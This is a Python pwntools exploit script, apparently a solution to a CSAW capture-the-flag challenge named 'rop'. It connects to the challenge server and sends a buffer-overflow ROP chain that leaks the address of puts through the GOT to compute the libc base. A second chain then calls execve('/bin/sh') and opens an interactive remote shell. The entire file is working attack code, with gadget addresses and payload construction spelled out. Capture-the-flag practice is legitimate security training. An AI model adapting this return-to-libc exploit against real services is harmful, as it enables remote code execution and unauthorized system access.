from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
binary = './rop'

bin = ELF(binary)
libc = ELF('./libc-2.27.so')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

conn = remote("pwn.chal.csaw.io", 5016)
# conn = process(binary)
# conn = gdb.debug(binary, '''
# break *0x400606
# break *0x400611
# continue
# ''')


payload = b"\x90" * cyclic_find(0x6161616b)
payload += p64(0x400683) # pop rdi
payload += p64(0x601018) # puts got
payload += p64(0x4004a0) # puts plt

payload += p64(0x4005dc) # main
payload += p64(0xdeadbeef)

#  + p64(0xdeadbeef)

print(conn.recvline())
conn.sendline(payload)

puts_got_raw = conn.recvline()[:-1].ljust(8, b'\x00')
puts_got = u64(puts_got_raw)
print(f"Puts GOT: {hex(puts_got)}")

libc_base = puts_got - libc.symbols["puts"]
print(f"Libc Base: {hex(libc_base)}")
system_got = libc_base + libc.symbols["system"]
print(f"System GOT: {hex(system_got)}")
libc_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b"\x90" * cyclic_find(0x6161616b)
# payload += p64(libc_base + 0x4f2c5) # oneshot

payload += p64(0x400683) # pop rdi
payload += p64(libc_sh)
payload += p64(libc_base + 0x0000000000001b96) # pop rdx
payload += p64(0x0)
payload += p64(0x400681) # pop rsi
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_base + libc.symbols["execve"])

# payload += p64(0x400683) # pop rdi
# payload += p64(libc_sh)
# payload += p64(system_got)
# payload += p64(0xdeadbeef)
print(conn.recvline())
conn.sendline(payload)

conn.sendline("echo hi")

conn.interactive()
conn.close()